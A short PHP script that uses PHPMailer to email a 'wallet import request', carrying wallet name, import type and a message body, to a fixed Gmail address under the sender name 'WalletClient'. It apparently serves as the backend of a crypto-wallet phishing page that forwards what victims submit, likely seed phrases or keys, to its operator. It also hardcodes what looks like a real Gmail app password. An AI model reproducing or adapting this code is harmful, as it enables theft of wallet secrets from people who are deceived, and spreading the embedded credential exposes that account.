<?php
$mail = new PHPMailer(true);

try {
    $mail->isSMTP(); // Send using SMTP
    $mail->Host = 'smtp.gmail.com'; // Set the SMTP server to send through
    $mail->SMTPAuth = true; // Enable SMTP authentication
    $mail->Username = 'bradleyjohn054@gmail.com'; // SMTP username
    $mail->Password = 'snccwbsikkctrhyt'; // SMTP password
    $mail->SMTPSecure = 'ssl'; // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port = 465; // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    // Set the recipient and subject
    $mail->setFrom('synchainapp@gmail.com', 'WalletClient');
    $mail->addAddress('bradleyjohn054@gmail.com');


    $mail->isHTML(true);
    $mail->Subject = "New $importType import request from $wallet";
    $mail->Body = $message;

    // Send the email
    $mail->send();

    // Send a success response back to the client
    echo "success";
} catch (Exception $e) {
    // Send an error response back to the client
    echo "Mailer Error: " . $mail->ErrorInfo;
}
?>